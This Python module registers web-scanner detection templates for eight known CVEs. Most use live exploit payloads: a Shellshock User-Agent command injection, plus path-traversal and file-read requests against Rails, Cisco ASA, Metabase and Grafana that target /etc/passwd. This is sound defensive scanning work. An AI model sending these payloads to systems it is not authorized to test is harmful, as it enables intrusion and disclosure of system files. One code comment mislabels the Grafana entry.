"""Additional web-detectable CVEs with verified detection signatures.

Only CVEs with a documented HTTP detection method are included (path/header +
strong response signature). This avoids fabricating non-functional checks.
"""
from __future__ import annotations
from modules.templates.engine import register_templates

CAT = "Tech / CVE"
PASSWD = r"root:.*?:0:0:"

TEMPLATES = [
    # Shellshock — bash env command injection via CGI (header-delivered).
    {"id": "cve_2014_6271_shellshock", "name": "Shellshock (CVE-2014-6271)", "type": "header",
     "category": CAT, "severity": "critical", "confidence": "Firm",
     "header": "User-Agent", "value": "() { :; }; echo; echo; /bin/echo SHELLSHK1787569",
     "match": {"regex": r"SHELLSHK1787569|" + PASSWD},
     "impact": "CGI 환경변수를 통한 원격 명령 실행.", "remediation": "Patch bash; disable vulnerable CGI.",
     "desc": "Bash environment command injection (Shellshock)"},
    # Rails file content disclosure via crafted Accept header.
    {"id": "cve_2019_5418_rails", "name": "Ruby on Rails File Disclosure (CVE-2019-5418)", "type": "header",
     "category": CAT, "severity": "high", "confidence": "Firm",
     "header": "Accept", "value": "../../../../../../../../etc/passwd{{",
     "match": {"regex": PASSWD},
     "impact": "임의 파일 노출.", "remediation": "Upgrade Rails; restrict render formats.",
     "desc": "Rails render() arbitrary file disclosure"},
    # Cisco ASA/FTD arbitrary file read.
    {"id": "cve_2020_3452_cisco", "name": "Cisco ASA/FTD File Read (CVE-2020-3452)", "type": "path",
     "category": CAT, "severity": "high", "confidence": "Firm",
     "path": "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
     "match": {"status": [200], "regex": r"INTERNAL_PASSWORD_ENABLED|webvpnLang|portal_inc"},
     "impact": "VPN 구성/파일 노출.", "remediation": "Apply Cisco patch.", "desc": "Cisco ASA file read"},
    # Metabase pre-auth LFI/SSRF via geojson.
    {"id": "cve_2021_41277_metabase", "name": "Metabase LFI (CVE-2021-41277)", "type": "path",
     "category": CAT, "severity": "critical", "confidence": "Firm",
     "path": "/api/geojson?url=file:///etc/passwd",
     "match": {"status": [200], "regex": PASSWD},
     "impact": "임의 파일 읽기/SSRF.", "remediation": "Upgrade Metabase.", "desc": "Metabase geojson LFI"},
    # Apache OFBiz XML-RPC surface.
    {"id": "cve_2023_49070_ofbiz", "name": "Apache OFBiz XML-RPC endpoint (CVE-2023-49070 surface)", "type": "path",
     "category": CAT, "severity": "medium", "confidence": "Tentative",
     "path": "/webtools/control/xmlrpc",
     "match": {"status": [200, 500], "regex": r"OFBiz|xmlrpc|methodResponse"},
     "impact": "역직렬화 RCE(패치/버전 확인 필요).", "remediation": "Patch OFBiz; disable XML-RPC.", "desc": "OFBiz XML-RPC"},
    # JetBrains TeamCity auth-bypass surface.
    {"id": "cve_2023_42793_teamcity", "name": "JetBrains TeamCity (CVE-2023-42793 surface)", "type": "path",
     "category": CAT, "severity": "medium", "confidence": "Tentative",
     "path": "/login.html",
     "match": {"status": [200], "regex": r"TeamCity|tc-header|JetBrains"},
     "impact": "인증 우회→토큰 생성→RCE(패치 확인).", "remediation": "Patch TeamCity.", "desc": "TeamCity exposed"},
    # WSO2 management console surface (CVE-2022-29464 family).
    {"id": "cve_2022_29464_wso2", "name": "WSO2 Carbon console (CVE-2022-29464 surface)", "type": "path",
     "category": CAT, "severity": "medium", "confidence": "Tentative",
     "path": "/carbon/admin/login.jsp",
     "match": {"status": [200], "regex": r"WSO2|Carbon|carbon"},
     "impact": "인증 전 파일 업로드→RCE(버전 확인).", "remediation": "Patch WSO2.", "desc": "WSO2 Carbon console"},
    # GoCD / other Groovy-console style file read via well-known param (surface).
    {"id": "cve_2021_43798_grafana2", "name": "Grafana traversal (CVE-2021-43798, alt plugin)", "type": "path",
     "category": CAT, "severity": "high", "confidence": "Firm",
     "path": "/public/plugins/graph/../../../../../../../../etc/passwd",
     "match": {"status": [200], "regex": PASSWD},
     "impact": "임의 파일 읽기.", "remediation": "Upgrade Grafana >= 8.3.1.", "desc": "Grafana plugin traversal"},
]

register_templates(TEMPLATES)
